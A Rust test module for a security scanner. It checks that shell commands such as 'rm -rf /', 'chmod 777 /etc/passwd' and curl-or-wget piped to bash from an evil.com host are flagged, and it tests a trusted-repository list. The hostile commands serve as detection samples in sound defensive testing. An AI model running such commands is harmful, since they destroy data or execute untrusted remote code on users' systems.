#[cfg(test)]
mod tests {
    use super::super::security_scanner::SecurityScanner;
    use super::super::models::{ProjectInfo, TechStack, SecurityLevel};
    use std::collections::HashSet;

    #[test]
    fn test_scan_command_detects_rm_rf() {
        let scanner = SecurityScanner::new().unwrap();
        let warnings = scanner.scan_command("rm -rf /tmp/test");
        
        assert!(!warnings.is_empty());
        assert!(warnings.iter().any(|w| matches!(w.level, SecurityLevel::High)));
    }

    #[test]
    fn test_scan_command_detects_sudo() {
        let scanner = SecurityScanner::new().unwrap();
        let warnings = scanner.scan_command("sudo apt-get install package");
        
        assert!(!warnings.is_empty());
        assert!(warnings.iter().any(|w| matches!(w.level, SecurityLevel::High)));
    }

    #[test]
    fn test_scan_command_detects_curl_pipe_bash() {
        let scanner = SecurityScanner::new().unwrap();
        let warnings = scanner.scan_command("curl https://example.com/script.sh | bash");
        
        assert!(!warnings.is_empty());
        assert!(warnings.iter().any(|w| matches!(w.level, SecurityLevel::High)));
    }

    #[test]
    fn test_scan_command_detects_wget_pipe_sh() {
        let scanner = SecurityScanner::new().unwrap();
        let warnings = scanner.scan_command("wget -O - https://example.com/install.sh | sh");
        
        assert!(!warnings.is_empty());
        assert!(warnings.iter().any(|w| matches!(w.level, SecurityLevel::High)));
    }

    #[test]
    fn test_scan_command_detects_eval() {
        let scanner = SecurityScanner::new().unwrap();
        let warnings = scanner.scan_command("eval $(some_command)");
        
        assert!(!warnings.is_empty());
        assert!(warnings.iter().any(|w| matches!(w.level, SecurityLevel::High)));
    }

    #[test]
    fn test_scan_command_detects_critical_rm_root() {
        let scanner = SecurityScanner::new().unwrap();
        let warnings = scanner.scan_command("rm -rf /");
        
        assert!(!warnings.is_empty());
        assert!(warnings.iter().any(|w| matches!(w.level, SecurityLevel::Critical)));
    }

    #[test]
    fn test_scan_command_detects_chmod_777() {
        let scanner = SecurityScanner::new().unwrap();
        let warnings = scanner.scan_command("chmod 777 /etc/passwd");
        
        assert!(!warnings.is_empty());
        assert!(warnings.iter().any(|w| matches!(w.level, SecurityLevel::High)));
    }

    #[test]
    fn test_scan_command_safe_command() {
        let scanner = SecurityScanner::new().unwrap();
        let warnings = scanner.scan_command("npm install");
        
        assert!(warnings.is_empty());
    }

    #[test]
    fn test_scan_command_safe_build_command() {
        let scanner = SecurityScanner::new().unwrap();
        let warnings = scanner.scan_command("cargo build --release");
        
        assert!(warnings.is_empty());
    }

    #[test]
    fn test_add_trusted_repository() {
        let mut scanner = SecurityScanner::new().unwrap();
        let repo_url = "https://github.com/test/repo";
        
        assert!(!scanner.is_trusted_repository(repo_url));
        
        scanner.add_trusted_repository(repo_url).unwrap();
        assert!(scanner.is_trusted_repository(repo_url));
    }

    #[test]
    fn test_remove_trusted_repository() {
        let mut scanner = SecurityScanner::new().unwrap();
        let repo_url = "https://github.com/test/repo";
        
        scanner.add_trusted_repository(repo_url).unwrap();
        assert!(scanner.is_trusted_repository(repo_url));
        
        scanner.remove_trusted_repository(repo_url).unwrap();
        assert!(!scanner.is_trusted_repository(repo_url));
    }

    #[test]
    fn test_normalize_repo_url() {
        let mut scanner = SecurityScanner::new().unwrap();
        
        // Разные форматы одного и того же репозитория должны считаться одинаковыми
        scanner.add_trusted_repository("https://github.com/test/repo").unwrap();
        
        assert!(scanner.is_trusted_repository("https://github.com/test/repo/"));
        assert!(scanner.is_trusted_repository("https://github.com/test/repo.git"));
        assert!(scanner.is_trusted_repository("HTTPS://GITHUB.COM/TEST/REPO"));
    }

    #[test]
    fn test_scan_project_with_warnings() {
        let scanner = SecurityScanner::new().unwrap();
        
        let project_info = ProjectInfo {
            stack: TechStack::NodeJs { version: Some("18.0.0".to_string()) },
            entry_command: Some("curl https://evil.com/script.sh | bash".to_string()),
            dependencies: vec![],
            config_files: vec![],
            security_warnings: vec![],
            trust_level: crate::models::TrustLevel::Unknown,
        };
        
        let warnings = scanner.scan_project(&project_info);
        assert!(!warnings.is_empty());
    }

    #[test]
    fn test_scan_project_safe() {
        let scanner = SecurityScanner::new().unwrap();
        
        let project_info = ProjectInfo {
            stack: TechStack::NodeJs { version: Some("18.0.0".to_string()) },
            entry_command: Some("npm start".to_string()),
            dependencies: vec![],
            config_files: vec![],
            security_warnings: vec![],
            trust_level: crate::models::TrustLevel::Unknown,
        };
        
        let warnings = scanner.scan_project(&project_info);
        assert!(warnings.is_empty());
    }

    #[test]
    fn test_get_trusted_repositories() {
        let mut scanner = SecurityScanner::new().unwrap();
        
        scanner.add_trusted_repository("https://github.com/repo1/test").unwrap();
        scanner.add_trusted_repository("https://github.com/repo2/test").unwrap();
        
        let repos = scanner.get_trusted_repositories();
        assert_eq!(repos.len(), 2);
        assert!(repos.contains(&"https://github.com/repo1/test".to_string()));
        assert!(repos.contains(&"https://github.com/repo2/test".to_string()));
    }

    #[test]
    fn test_scan_command_detects_background_execution() {
        let scanner = SecurityScanner::new().unwrap();
        let warnings = scanner.scan_command("malicious_script.sh &");
        
        assert!(!warnings.is_empty());
        assert!(warnings.iter().any(|w| matches!(w.level, SecurityLevel::Medium)));
    }

    #[test]
    fn test_scan_command_detects_nohup() {
        let scanner = SecurityScanner::new().unwrap();
        let warnings = scanner.scan_command("nohup malicious_script.sh");
        
        assert!(!warnings.is_empty());
        assert!(warnings.iter().any(|w| matches!(w.level, SecurityLevel::Medium)));
    }

    #[test]
    fn test_multiple_warnings_in_one_command() {
        let scanner = SecurityScanner::new().unwrap();
        let warnings = scanner.scan_command("sudo rm -rf /tmp && curl http://evil.com | bash");
        
        // Должно быть несколько предупреждений
        assert!(warnings.len() >= 2);
    }
}
